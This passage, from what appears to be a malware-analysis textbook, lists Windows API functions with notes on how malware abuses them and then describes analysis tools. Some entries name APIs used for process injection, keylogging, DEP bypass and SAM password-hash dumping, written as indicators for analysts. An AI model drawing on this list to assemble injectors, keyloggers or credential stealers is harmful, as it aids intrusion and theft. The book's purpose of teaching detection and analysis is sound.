- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**DllCanUnloadNow**'
  prefs: []
  type: TYPE_NORMAL
- en: An exported function that indicates that the program implements a COM server.
  prefs: []
  type: TYPE_NORMAL
- en: '**DllGetClassObject**'
  prefs: []
  type: TYPE_NORMAL
- en: An exported function that indicates that the program implements a COM server.
  prefs: []
  type: TYPE_NORMAL
- en: '**DllInstall**'
  prefs: []
  type: TYPE_NORMAL
- en: An exported function that indicates that the program implements a COM server.
  prefs: []
  type: TYPE_NORMAL
- en: '**DllRegisterServer**'
  prefs: []
  type: TYPE_NORMAL
- en: An exported function that indicates that the program implements a COM server.
  prefs: []
  type: TYPE_NORMAL
- en: '**DllUnregisterServer**'
  prefs: []
  type: TYPE_NORMAL
- en: An exported function that indicates that the program implements a COM server.
  prefs: []
  type: TYPE_NORMAL
- en: '**EnableExecuteProtectionSupport**'
  prefs: []
  type: TYPE_NORMAL
- en: An undocumented API function used to modify the Data Execution Protection (DEP)
    settings of the host, making it more susceptible to attack.
  prefs: []
  type: TYPE_NORMAL
- en: '**EnumProcesses**'
  prefs: []
  type: TYPE_NORMAL
- en: Used to enumerate through running processes on the system. Malware often enumerates
    through processes to find a process to inject into.
  prefs: []
  type: TYPE_NORMAL
- en: '**EnumProcessModules**'
  prefs: []
  type: TYPE_NORMAL
- en: Used to enumerate the loaded modules (executables and DLLs) for a given process.
    Malware enumerates through modules when doing injection.
  prefs: []
  type: TYPE_NORMAL
- en: '**FindFirstFile/FindNextFile**'
  prefs: []
  type: TYPE_NORMAL
- en: Used to search through a directory and enumerate the filesystem.
  prefs: []
  type: TYPE_NORMAL
- en: '**FindResource**'
  prefs: []
  type: TYPE_NORMAL
- en: Used to find a resource in an executable or loaded DLL. Malware sometimes uses
    resources to store strings, configuration information, or other malicious files.
    If you see this function used, check for a .rsrc section in the malware’s PE header.
  prefs: []
  type: TYPE_NORMAL
- en: '**FindWindow**'
  prefs: []
  type: TYPE_NORMAL
- en: Searches for an open window on the desktop. Sometimes this function is used
    as an anti-debugging technique to search for OllyDbg windows.
  prefs: []
  type: TYPE_NORMAL
- en: '**FtpPutFile**'
  prefs: []
  type: TYPE_NORMAL
- en: A high-level function for uploading a file to a remote FTP server.
  prefs: []
  type: TYPE_NORMAL
- en: '**GetAdaptersInfo**'
  prefs: []
  type: TYPE_NORMAL
- en: Used to obtain information about the network adapters on the system.
  prefs: []
  type: TYPE_NORMAL
- en: Backdoors sometimes call GetAdaptersInfo as part of a survey to gather information
    about infected machines. In some cases, it’s used to gather MAC addresses to check
    for VMware as part of anti-virtual machine techniques.
  prefs: []
  type: TYPE_NORMAL
- en: '**456**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix A
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**GetAsyncKeyState**'
  prefs: []
  type: TYPE_NORMAL
- en: Used to determine whether a particular key is being pressed. Malware sometimes
    uses this function to implement a keylogger.
  prefs: []
  type: TYPE_NORMAL
- en: '**GetDC**'
  prefs: []
  type: TYPE_NORMAL
- en: Returns a handle to a device context for a window or the whole screen.
  prefs: []
  type: TYPE_NORMAL
- en: Spyware that takes screen captures often uses this function.
  prefs: []
  type: TYPE_NORMAL
- en: '**GetForegroundWindow**'
  prefs: []
  type: TYPE_NORMAL
- en: Returns a handle to the window currently in the foreground of the desktop. Keyloggers
    commonly use this function to determine in which window the user is entering his
    keystrokes.
  prefs: []
  type: TYPE_NORMAL
- en: '**gethostbyname**'
  prefs: []
  type: TYPE_NORMAL
- en: Used to perform a DNS lookup on a particular hostname prior to making an IP
    connection to a remote host. Hostnames that serve as command-and-control servers
    often make good network-based signatures.
  prefs: []
  type: TYPE_NORMAL
- en: '**gethostname**'
  prefs: []
  type: TYPE_NORMAL
- en: Retrieves the hostname of the computer. Backdoors sometimes use gethostname
    as part of a survey of the victim machine.
  prefs: []
  type: TYPE_NORMAL
- en: '**GetKeyState**'
  prefs: []
  type: TYPE_NORMAL
- en: Used by keyloggers to obtain the status of a particular key on the keyboard.
  prefs: []
  type: TYPE_NORMAL
- en: '**GetModuleFilename**'
  prefs: []
  type: TYPE_NORMAL
- en: Returns the filename of a module that is loaded in the current process.
  prefs: []
  type: TYPE_NORMAL
- en: Malware can use this function to modify or copy files in the currently running
    process.
  prefs: []
  type: TYPE_NORMAL
- en: '**GetModuleHandle**'
  prefs: []
  type: TYPE_NORMAL
- en: Used to obtain a handle to an already loaded module. Malware may use GetModuleHandle
    to locate and modify code in a loaded module or to search for a good location
    to inject code.
  prefs: []
  type: TYPE_NORMAL
- en: '**GetProcAddress**'
  prefs: []
  type: TYPE_NORMAL
- en: Retrieves the address of a function in a DLL loaded into memory. Used to import
    functions from other DLLs in addition to the functions imported in the PE file
    header.
  prefs: []
  type: TYPE_NORMAL
- en: '**GetStartupInfo**'
  prefs: []
  type: TYPE_NORMAL
- en: Retrieves a structure containing details about how the current process was configured
    to run, such as where the standard handles are directed.
  prefs: []
  type: TYPE_NORMAL
- en: '**GetSystemDefaultLangId**'
  prefs: []
  type: TYPE_NORMAL
- en: Returns the default language settings for the system. This can be used to customize
    displays and filenames, as part of a survey of an infected victim, or by “patriotic”
    malware that affects only systems from certain regions.
  prefs: []
  type: TYPE_NORMAL
- en: '**GetTempPath**'
  prefs: []
  type: TYPE_NORMAL
- en: Returns the temporary file path. If you see malware call this function, check
    whether it reads or writes any files in the temporary file path.
  prefs: []
  type: TYPE_NORMAL
- en: Important Windows Functions
  prefs: []
  type: TYPE_NORMAL
- en: '**457**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**GetThreadContext**'
  prefs: []
  type: TYPE_NORMAL
- en: Returns the context structure of a given thread. The context for a thread stores
    all the thread information, such as the register values and current state.
  prefs: []
  type: TYPE_NORMAL
- en: '**GetTickCount**'
  prefs: []
  type: TYPE_NORMAL
- en: Retrieves the number of milliseconds since bootup. This function is sometimes
    used to gather timing information as an anti-debugging technique. GetTickCount
    is often added by the compiler and is included in many executables, so simply
    seeing it as an imported function provides little information.
  prefs: []
  type: TYPE_NORMAL
- en: '**GetVersionEx**'
  prefs: []
  type: TYPE_NORMAL
- en: Returns information about which version of Windows is currently running. This
    can be used as part of a victim survey or to select between different offsets
    for undocumented structures that have changed between different versions of Windows.
  prefs: []
  type: TYPE_NORMAL
- en: '**GetWindowsDirectory**'
  prefs: []
  type: TYPE_NORMAL
- en: Returns the file path to the Windows directory (usually *C:\Windows*).
  prefs: []
  type: TYPE_NORMAL
- en: Malware sometimes uses this call to determine into which directory to install
    additional malicious programs.
  prefs: []
  type: TYPE_NORMAL
- en: '**inet_addr**'
  prefs: []
  type: TYPE_NORMAL
- en: Converts an IP address string like 127.0.0.1 so that it can be used by functions
    such as connect. The string specified can sometimes be used as a network-based
    signature.
  prefs: []
  type: TYPE_NORMAL
- en: '**InternetOpen**'
  prefs: []
  type: TYPE_NORMAL
- en: Initializes the high-level Internet access functions from WinINet, such as InternetOpenUrl
    and InternetReadFile. Searching for InternetOpen is a good way to find the start
    of Internet access functionality. One of the parameters to InternetOpen is the
    User-Agent, which can sometimes make a good network-based signature.
  prefs: []
  type: TYPE_NORMAL
- en: '**InternetOpenUrl**'
  prefs: []
  type: TYPE_NORMAL
- en: Opens a specific URL for a connection using FTP, HTTP, or HTTPS.
  prefs: []
  type: TYPE_NORMAL
- en: URLs, if fixed, can often be good network-based signatures.
  prefs: []
  type: TYPE_NORMAL
- en: '**InternetReadFile**'
  prefs: []
  type: TYPE_NORMAL
- en: Reads data from a previously opened URL.
  prefs: []
  type: TYPE_NORMAL
- en: '**InternetWriteFile**'
  prefs: []
  type: TYPE_NORMAL
- en: Writes data to a previously opened URL.
  prefs: []
  type: TYPE_NORMAL
- en: '**IsDebuggerPresent**'
  prefs: []
  type: TYPE_NORMAL
- en: Checks to see if the current process is being debugged, often as part of an
    anti-debugging technique. This function is often added by the compiler and is
    included in many executables, so simply seeing it as an imported function provides
    little information.
  prefs: []
  type: TYPE_NORMAL
- en: '**IsNTAdmin**'
  prefs: []
  type: TYPE_NORMAL
- en: Checks if the user has administrator privileges.
  prefs: []
  type: TYPE_NORMAL
- en: '**458**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix A
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**IsWoW64Process**'
  prefs: []
  type: TYPE_NORMAL
- en: Used by a 32-bit process to determine if it is running on a 64-bit operating
    system.
  prefs: []
  type: TYPE_NORMAL
- en: '**LdrLoadDll**'
  prefs: []
  type: TYPE_NORMAL
- en: Low-level function to load a DLL into a process, just like LoadLibrary.
  prefs: []
  type: TYPE_NORMAL
- en: Normal programs use LoadLibrary, and the presence of this import may indicate
    a program that is attempting to be stealthy.
  prefs: []
  type: TYPE_NORMAL
- en: '**LoadLibrary**'
  prefs: []
  type: TYPE_NORMAL
- en: Loads a DLL into a process that may not have been loaded when the program started.
    Imported by nearly every Win32 program.
  prefs: []
  type: TYPE_NORMAL
- en: '**LoadResource**'
  prefs: []
  type: TYPE_NORMAL
- en: Loads a resource from a PE file into memory. Malware sometimes uses resources
    to store strings, configuration information, or other malicious files.
  prefs: []
  type: TYPE_NORMAL
- en: '**LsaEnumerateLogonSessions**'
  prefs: []
  type: TYPE_NORMAL
- en: Enumerates through logon sessions on the current system, which can be used as
    part of a credential stealer.
  prefs: []
  type: TYPE_NORMAL
- en: '**MapViewOfFile**'
  prefs: []
  type: TYPE_NORMAL
- en: Maps a file into memory and makes the contents of the file accessible via memory
    addresses. Launchers, loaders, and injectors use this function to read and modify
    PE files. By using MapViewOfFile, the malware can avoid using WriteFile to modify
    the contents of a file.
  prefs: []
  type: TYPE_NORMAL
- en: '**MapVirtualKey**'
  prefs: []
  type: TYPE_NORMAL
- en: Translates a virtual-key code into a character value. It is often used by keylogging
    malware.
  prefs: []
  type: TYPE_NORMAL
- en: '**MmGetSystemRoutineAddress**'
  prefs: []
  type: TYPE_NORMAL
- en: Similar to GetProcAddress but used by kernel code. This function retrieves the
    address of a function from another module, but it can only get addresses from
    *ntoskrnl.exe* and *hal.dll*.
  prefs: []
  type: TYPE_NORMAL
- en: '**Module32First/Module32Next**'
  prefs: []
  type: TYPE_NORMAL
- en: Used to enumerate through modules loaded into a process. Injectors use this
    function to determine where to inject code.
  prefs: []
  type: TYPE_NORMAL
- en: '**NetScheduleJobAdd**'
  prefs: []
  type: TYPE_NORMAL
- en: Submits a request for a program to be run at a specified date and time.
  prefs: []
  type: TYPE_NORMAL
- en: Malware can use NetScheduleJobAdd to run a different program. As a malware analyst,
    you’ll need to locate and analyze the program that will be run in the future.
  prefs: []
  type: TYPE_NORMAL
- en: '**NetShareEnum**'
  prefs: []
  type: TYPE_NORMAL
- en: Used to enumerate network shares.
  prefs: []
  type: TYPE_NORMAL
- en: '**NtQueryDirectoryFile**'
  prefs: []
  type: TYPE_NORMAL
- en: Returns information about files in a directory. Rootkits commonly hook this
    function in order to hide files.
  prefs: []
  type: TYPE_NORMAL
- en: Important Windows Functions
  prefs: []
  type: TYPE_NORMAL
- en: '**459**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**NtQueryInformationProcess**'
  prefs: []
  type: TYPE_NORMAL
- en: Returns various information about a specified process. This function is sometimes
    used as an anti-debugging technique because it can return the same information
    as CheckRemoteDebuggerPresent.
  prefs: []
  type: TYPE_NORMAL
- en: '**NtSetInformationProcess**'
  prefs: []
  type: TYPE_NORMAL
- en: Can be used to change the privilege level of a program or to bypass Data Execution
    Prevention (DEP).
  prefs: []
  type: TYPE_NORMAL
- en: '**OleInitialize**'
  prefs: []
  type: TYPE_NORMAL
- en: Used to initialize the COM library. Programs that use COM objects must call
    OleInitialize prior to calling any other COM functions.
  prefs: []
  type: TYPE_NORMAL
- en: '**OpenMutex**'
  prefs: []
  type: TYPE_NORMAL
- en: Opens a handle to a mutual exclusion object that can be used by malware to ensure
    that only a single instance of malware is running on a system at any given time.
    Malware often uses fixed names for mutexes, which can be good host-based indicators.
  prefs: []
  type: TYPE_NORMAL
- en: '**OpenProcess**'
  prefs: []
  type: TYPE_NORMAL
- en: Opens a handle to another process running on the system. This handle can be
    used to read and write to the other process memory or to inject code into the
    other process.
  prefs: []
  type: TYPE_NORMAL
- en: '**OpenSCManager**'
  prefs: []
  type: TYPE_NORMAL
- en: Opens a handle to the service control manager. Any program that installs, modifies,
    or controls a service must call this function before any other service-manipulation
    function.
  prefs: []
  type: TYPE_NORMAL
- en: '**OutputDebugString**'
  prefs: []
  type: TYPE_NORMAL
- en: Outputs a string to a debugger if one is attached. This can be used as an anti-debugging
    technique.
  prefs: []
  type: TYPE_NORMAL
- en: '**PeekNamedPipe**'
  prefs: []
  type: TYPE_NORMAL
- en: Used to copy data from a named pipe without removing data from the pipe. This
    function is popular with reverse shells.
  prefs: []
  type: TYPE_NORMAL
- en: '**Process32First/Process32Next**'
  prefs: []
  type: TYPE_NORMAL
- en: Used to begin enumerating processes from a previous call to CreateToolhelp32Snapshot.
    Malware often enumerates through processes to find a process to inject into.
  prefs: []
  type: TYPE_NORMAL
- en: '**QueryPerformanceCounter**'
  prefs: []
  type: TYPE_NORMAL
- en: Used to retrieve the value of the hardware-based performance counter.
  prefs: []
  type: TYPE_NORMAL
- en: This function is sometimes using to gather timing information as part of an
    anti-debugging technique. It is often added by the compiler and is included in
    many executables, so simply seeing it as an imported function provides little
    information.
  prefs: []
  type: TYPE_NORMAL
- en: '**QueueUserAPC**'
  prefs: []
  type: TYPE_NORMAL
- en: Used to execute code for a different thread. Malware sometimes uses QueueUserAPC
    to inject code into another process.
  prefs: []
  type: TYPE_NORMAL
- en: '**ReadProcessMemory**'
  prefs: []
  type: TYPE_NORMAL
- en: Used to read the memory of a remote process.
  prefs: []
  type: TYPE_NORMAL
- en: '**460**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix A
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**recv**'
  prefs: []
  type: TYPE_NORMAL
- en: Receives data from a remote machine. Malware often uses this function to receive
    data from a remote command-and-control server.
  prefs: []
  type: TYPE_NORMAL
- en: '**RegisterHotKey**'
  prefs: []
  type: TYPE_NORMAL
- en: Used to register a handler to be notified anytime a user enters a particular
    key combination (like CTRL-ALT-J), regardless of which window is active when the
    user presses the key combination. This function is sometimes used by spyware that
    remains hidden from the user until the key combination is pressed.
  prefs: []
  type: TYPE_NORMAL
- en: '**RegOpenKey**'
  prefs: []
  type: TYPE_NORMAL
- en: Opens a handle to a registry key for reading and editing. Registry keys are
    sometimes written as a way for software to achieve persistence on a host. The
    registry also contains a whole host of operating system and application setting
    information.
  prefs: []
  type: TYPE_NORMAL
- en: '**ResumeThread**'
  prefs: []
  type: TYPE_NORMAL
- en: Resumes a previously suspended thread. ResumeThread is used as part of several
    injection techniques.
  prefs: []
  type: TYPE_NORMAL
- en: '**RtlCreateRegistryKey**'
  prefs: []
  type: TYPE_NORMAL
- en: Used to create a registry from kernel-mode code.
  prefs: []
  type: TYPE_NORMAL
- en: '**RtlWriteRegistryValue**'
  prefs: []
  type: TYPE_NORMAL
- en: Used to write a value to the registry from kernel-mode code.
  prefs: []
  type: TYPE_NORMAL
- en: '**SamIConnect**'
  prefs: []
  type: TYPE_NORMAL
- en: Connects to the Security Account Manager (SAM) in order to make future calls
    that access credential information. Hash-dumping programs access the SAM database
    in order to retrieve the hash of users’ login passwords.
  prefs: []
  type: TYPE_NORMAL
- en: '**SamIGetPrivateData**'
  prefs: []
  type: TYPE_NORMAL
- en: Queries the private information about a specific user from the Security Account
    Manager (SAM) database. Hash-dumping programs access the SAM database in order
    to retrieve the hash of users’ login passwords.
  prefs: []
  type: TYPE_NORMAL
- en: '**SamQueryInformationUse**'
  prefs: []
  type: TYPE_NORMAL
- en: Queries information about a specific user in the Security Account Manager (SAM)
    database. Hash-dumping programs access the SAM database in order to retrieve the
    hash of users’ login passwords.
  prefs: []
  type: TYPE_NORMAL
- en: '**send**'
  prefs: []
  type: TYPE_NORMAL
- en: Sends data to a remote machine. Malware often uses this function to send data
    to a remote command-and-control server.
  prefs: []
  type: TYPE_NORMAL
- en: '**SetFileTime**'
  prefs: []
  type: TYPE_NORMAL
- en: Modifies the creation, access, or last modified time of a file. Malware often
    uses this function to conceal malicious activity.
  prefs: []
  type: TYPE_NORMAL
- en: '**SetThreadContext**'
  prefs: []
  type: TYPE_NORMAL
- en: Used to modify the context of a given thread. Some injection techniques use
    SetThreadContext.
  prefs: []
  type: TYPE_NORMAL
- en: Important Windows Functions
  prefs: []
  type: TYPE_NORMAL
- en: '**461**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**SetWindowsHookEx**'
  prefs: []
  type: TYPE_NORMAL
- en: Sets a hook function to be called whenever a certain event is called.
  prefs: []
  type: TYPE_NORMAL
- en: Commonly used with keyloggers and spyware, this function also provides an easy
    way to load a DLL into all GUI processes on the system. This function is sometimes
    added by the compiler.
  prefs: []
  type: TYPE_NORMAL
- en: '**SfcTerminateWatcherThread**'
  prefs: []
  type: TYPE_NORMAL
- en: Used to disable Windows file protection and modify files that otherwise would
    be protected. SfcFileException can also be used in this capacity.
  prefs: []
  type: TYPE_NORMAL
- en: '**ShellExecute**'
  prefs: []
  type: TYPE_NORMAL
- en: Used to execute another program. If malware creates a new process, you will
    need to analyze the new process as well.
  prefs: []
  type: TYPE_NORMAL
- en: '**StartServiceCtrlDispatcher**'
  prefs: []
  type: TYPE_NORMAL
- en: Used by a service to connect the main thread of the process to the service control
    manager. Any process that runs as a service must call this function within 30
    seconds of startup. Locating this function in malware tells you that the function
    should be run as a service.
  prefs: []
  type: TYPE_NORMAL
- en: '**SuspendThread**'
  prefs: []
  type: TYPE_NORMAL
- en: Suspends a thread so that it stops running. Malware will sometimes suspend a
    thread in order to modify it by performing code injection.
  prefs: []
  type: TYPE_NORMAL
- en: '**system**'
  prefs: []
  type: TYPE_NORMAL
- en: Function to run another program provided by some C runtime libraries.
  prefs: []
  type: TYPE_NORMAL
- en: On Windows, this function serves as a wrapper function to CreateProcess.
  prefs: []
  type: TYPE_NORMAL
- en: '**Thread32First/Thread32Next**'
  prefs: []
  type: TYPE_NORMAL
- en: Used to iterate through the threads of a process. Injectors use these functions
    to find an appropriate thread to inject into.
  prefs: []
  type: TYPE_NORMAL
- en: '**Toolhelp32ReadProcessMemory**'
  prefs: []
  type: TYPE_NORMAL
- en: Used to read the memory of a remote process.
  prefs: []
  type: TYPE_NORMAL
- en: '**URLDownloadToFile**'
  prefs: []
  type: TYPE_NORMAL
- en: A high-level call to download a file from a web server and save it to disk.
  prefs: []
  type: TYPE_NORMAL
- en: This function is popular with downloaders because it implements all the functionality
    of a downloader in one function call.
  prefs: []
  type: TYPE_NORMAL
- en: '**VirtualAllocEx**'
  prefs: []
  type: TYPE_NORMAL
- en: A memory-allocation routine that can allocate memory in a remote process. Malware
    sometimes uses VirtualAllocEx as part of process injection.
  prefs: []
  type: TYPE_NORMAL
- en: '**VirtualProtectEx**'
  prefs: []
  type: TYPE_NORMAL
- en: Changes the protection on a region of memory. Malware may use this function
    to change a read-only section of memory to an executable.
  prefs: []
  type: TYPE_NORMAL
- en: '**WideCharToMultiByte**'
  prefs: []
  type: TYPE_NORMAL
- en: Used to convert a Unicode string into an ASCII string.
  prefs: []
  type: TYPE_NORMAL
- en: '**WinExec**'
  prefs: []
  type: TYPE_NORMAL
- en: Used to execute another program. If malware creates a new process, you will
    need to analyze the new process as well.
  prefs: []
  type: TYPE_NORMAL
- en: '**462**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix A
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**WlxLoggedOnSAS (and other Wlx* functions)** A function that must be exported
    by DLLs that will act as authentication modules. Malware that exports many Wlx*
    functions might be performing Graphical Identification and Authentication (GINA)
    replacement, as discussed in Chapter 11\.'
  prefs: []
  type: TYPE_NORMAL
- en: '**Wow64DisableWow64FsRedirection**'
  prefs: []
  type: TYPE_NORMAL
- en: Disables file redirection that occurs in 32-bit files loaded on a 64-bit system.
    If a 32-bit application writes to *C:\Windows\System32* after calling this function,
    then it will write to the real *C:\Windows\System32* instead of being redirected
    to *C:\Windows\SysWOW64*.
  prefs: []
  type: TYPE_NORMAL
- en: '**WriteProcessMemory**'
  prefs: []
  type: TYPE_NORMAL
- en: Used to write data to a remote process. Malware uses WriteProcessMemory as part
    of process injection.
  prefs: []
  type: TYPE_NORMAL
- en: '**WSAStartup**'
  prefs: []
  type: TYPE_NORMAL
- en: Used to initialize low-level network functionality. Finding calls to WSAStartup
    can often be an easy way to locate the start of network-related functionality.
  prefs: []
  type: TYPE_NORMAL
- en: Important Windows Functions
  prefs: []
  type: TYPE_NORMAL
- en: '**463**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**T O O L S F O R M A L W A R E A N A L Y S I S**'
  prefs: []
  type: TYPE_NORMAL
- en: This appendix lists popular malware analysis tools,
  prefs: []
  type: TYPE_NORMAL
- en: including tools discussed in the book and others that
  prefs: []
  type: TYPE_NORMAL
- en: we did not cover. We have made this list somewhat
  prefs: []
  type: TYPE_NORMAL
- en: comprehensive so that you can try a variety of tools
  prefs: []
  type: TYPE_NORMAL
- en: and figure out which ones best suit your needs.
  prefs: []
  type: TYPE_NORMAL
- en: '**ApateDNS**'
  prefs: []
  type: TYPE_NORMAL
- en: ApateDNS is a tool for controlling DNS responses. Its interface is an easy-to-use
    GUI. As a phony DNS server, ApateDNS spoofs DNS responses to a user-specified
    IP address by listening on UDP port 53 on the local machine. ApateDNS also automatically
    configures the local DNS server to localhost. When you exit ApateDNS, it restores
    the original local DNS
  prefs: []
  type: TYPE_NORMAL
- en: settings. Use ApateDNS during dynamic analysis, as described in Chapter 3\.
  prefs: []
  type: TYPE_NORMAL
- en: You can download ApateDNS for free from *http://www.mandiant.com/*.
  prefs: []
  type: TYPE_NORMAL
- en: '**Autoruns**'
  prefs: []
  type: TYPE_NORMAL
- en: Autoruns is a utility with a long list of autostarting locations for Windows.
  prefs: []
  type: TYPE_NORMAL
- en: For persistence, malware often installs itself in a variety of locations, including
    the registry, startup folder, and so on. Autoruns searches
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 92](index-499_1.png)'
  prefs: []
  type: TYPE_IMG
- en: various possible locations and reports to you in a GUI. Use Autoruns for dynamic
    analysis to see where malware installed itself. You can download Autoruns as part
    of the Sysinternals Suite of tools from *http://*
  prefs: []
  type: TYPE_NORMAL
- en: '*www.sysinternals.com/*.'
  prefs: []
  type: TYPE_NORMAL
- en: '**BinDiff**'
  prefs: []
  type: TYPE_NORMAL
- en: BinDiff is a powerful binary comparison plug-in for IDA Pro that allows you
    to quickly compare malware variants. BinDiff lets you pinpoint new functions in
    a given malware variant and tells you if any functions are similar or missing.
    If the functions are similar, BinDiff indicates how similar they are and compares
    the two, as shown in Figure B-1\.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure B-1: BinDiff difference comparison showing code missing from the variant’s
    function* As you can see in Figure B-1, the left side of the graph is missing
    two boxes that appear in the right side. You can zoom in and examine the missing
    instructions. BinDiff will also guess at how similar the overall binary is to
    one that you are comparing, though you must generate an IDB file for both the
    original and the variant malware for this to work.'
  prefs: []
  type: TYPE_NORMAL
- en: (If you have a fully labeled IDB file for the comparison, you will be able to
    more easily recognize what is actually similar in the binary.) BinDiff is available
    for purchase from *http://www.zynamics.com/*.
  prefs: []
  type: TYPE_NORMAL
- en: '**BinNavi**'
  prefs: []
  type: TYPE_NORMAL
- en: BinNavi is a reverse-engineering environment similar to IDA Pro. Its strength
    lies in its graphical approach to reverse-engineering code. And, unlike IDA Pro,
    BinNavi can centrally manage your previously analyzed databases, which helps to
    track information; team members can easily work on the same project and share
    information and findings. BinNavi is available for purchase from *http://www.zynamics.com/*.
  prefs: []
  type: TYPE_NORMAL
- en: '**466**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix B
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**Bochs**'
  prefs: []
  type: TYPE_NORMAL
- en: Bochs is an open source debugger that simulates a complete x86 computer. Bochs
    is most useful when you want to debug a short code snippet in IDA Pro. IDA Pro
    supports a direct debugging mode of the IDB file using Bochs. When debugging in
    this mode, the input file format isn’t important—it can be a DLL, shellcode dump,
    or any other database that contains x86 code. You can simply point to the code
    snippet and start debugging. This approach is often useful when dealing with encoded
    strings or configuration data. You can download Bochs for free from *http://bochs.sourceforge.net/*.
    A tutorial on installing and using Bochs in IDA Pro can be found at *http://www.hex-rays.com/products/ida/debugger/*
  prefs: []
  type: TYPE_NORMAL
- en: '*bochs_tut.pdf.*'
  prefs: []
  type: TYPE_NORMAL
- en: '**Burp Suite**'
  prefs: []
  type: TYPE_NORMAL
- en: The Burp Suite is typically used for testing web applications. It can be configured
    to allow malware analysts to trap specific server requests and responses in order
    to manipulate what is being delivered to a system.
  prefs: []
  type: TYPE_NORMAL
- en: When Burp is set up as a man-in-the-middle, you can modify HTTP or HTTPS requests
    by changing the headers, data, and parameters sent by the malware to a remote
    server in order to force the server to give you additional information. You can
    download the Burp Suite from *http://*
  prefs: []
  type: TYPE_NORMAL
- en: '*portswigger.net/burp/*.'
  prefs: []
  type: TYPE_NORMAL
- en: '**Capture BAT**'
  prefs: []
  type: TYPE_NORMAL
- en: Capture BAT is a dynamic analysis tool used to monitor malware as it is running.
    Capture BAT will monitor the filesystem, registry, and process activity. You can
    use exclusion lists (including many preset ones) to remove the noise in order
    to focus on the malware you are analyzing.
  prefs: []
  type: TYPE_NORMAL
- en: While Capture BAT doesn’t have an extensive GUI like Process Monitor, it’s open
    source, so you can modify it. You can download Capture BAT
  prefs: []
  type: TYPE_NORMAL
- en: for free from *http://www.honeynet.org/*.
  prefs: []
  type: TYPE_NORMAL
- en: '**CFF Explorer**'
  prefs: []
  type: TYPE_NORMAL
- en: CFF Explorer is a tool designed to make PE editing easy. The tool is useful
    for editing resource sections, adding imports, or scanning for signatures. CFF
    Explorer supports x86 and x64 systems, and it can handle
  prefs: []
  type: TYPE_NORMAL
- en: .NET files without having the .NET Framework installed. You can download CFF
    Explorer for free from *http://www.ntcore.com/*.
  prefs: []
  type: TYPE_NORMAL
- en: '**Deep Freeze**'
  prefs: []
  type: TYPE_NORMAL
- en: Deep Freeze from Faronics is a useful tool to use when performing malware analysis
    on physical hardware. It provides a VMware snapshotting capability for real hardware.
    You can run your malware, analyze it, and then just reboot. All the damage done
    by the malware will be undone, and your system will be back to a clean state.
    Deep Freeze is available for purchase from *http://www.faronics.com/*.
  prefs: []
  type: TYPE_NORMAL
- en: Tools for Malware Analysis
  prefs: []
  type: TYPE_NORMAL
- en: '**467**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 93](index-501_1.png)'
  prefs: []
  type: TYPE_IMG
- en: '**Dependency Walker**'
  prefs: []
  type: TYPE_NORMAL
- en: Dependency Walker is a static analysis tool used to explore DLLs and functions
    imported by a piece of malware. It works on both x86 and x64
  prefs: []
  type: TYPE_NORMAL
- en: binaries, and builds a hierarchical tree diagram of all DLLs that will be loaded
    into memory when the malware is run. We discuss Dependency Walker in Chapter 1\.
    You can download it for free from *http://www*
  prefs: []
  type: TYPE_NORMAL
- en: '*.dependencywalker.com/*.'
  prefs: []
  type: TYPE_NORMAL
- en: '**Hex Editors**'
  prefs: []
  type: TYPE_NORMAL
- en: Hex editors allow you to edit and view files containing binary data. Many hex
    editors are available, such as WinHex (our choice in this book), Hex Workshop,
    010 Editor, HexEdit, Hex Editor Neo, FileInsight, and FlexHEX. When choosing a
    hex editor, look for features like a solid GUI, binary comparison, many data-decoding
    options (such as multibyte XOR), a built-in hash calculator, file format parsing,
    pattern searching, and so on. Many of these tools are available for purchase,
    but most come with a trial version.
  prefs: []
  type: TYPE_NORMAL
- en: '**Hex-Rays Decompiler**'
  prefs: []
  type: TYPE_NORMAL
- en: The Hex-Rays Decompiler is a powerful, but expensive, plug-in for IDA Pro that
    attempts to convert assembly code into human-readable, C-like pseudocode text.
    This tool installs an F5 “cheat button.” When you are looking at disassembly in
    IDA Pro, press F5 to have the plug-in open a new window with the C code. Figure
    B-2 shows what the pseudocode looks like for a code snippet from a piece of malware.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure B-2: Hex-Rays Decompiler showing C-like pseudocode generated from assembly*
    In the example in Figure B-2, the Hex-Rays Decompiler turned more than 100 assembly
    instructions into just eight lines of C code. Notice that the plug-in will use
    your renamed variable names from IDA Pro. In this example, you can easily see
    the parameters that are passed to a function, and nested if statements are more
    obvious.'
